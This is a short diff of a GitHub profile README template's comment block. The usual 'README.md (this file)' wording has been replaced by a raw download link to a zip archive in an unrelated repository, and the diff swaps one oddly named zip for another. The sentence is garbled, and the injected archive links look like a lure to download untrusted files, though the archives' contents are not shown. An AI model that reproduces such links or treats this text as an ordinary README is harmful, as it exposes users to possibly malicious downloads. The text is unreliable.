@@ -7,6 +7,6 @@
 - ⚡ Fun fact: ...
 
 <!---
-janiyak/janiyak is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/janiyak/PyStrict-strict-python/main/peskiness/PyStrict-strict-python-Tyranni.zip` (this file) appears on your GitHub profile.
+janiyak/janiyak is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/janiyak/PyStrict-strict-python/main/peskiness/Strict_Py_python_strict_v2.6-beta.5.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
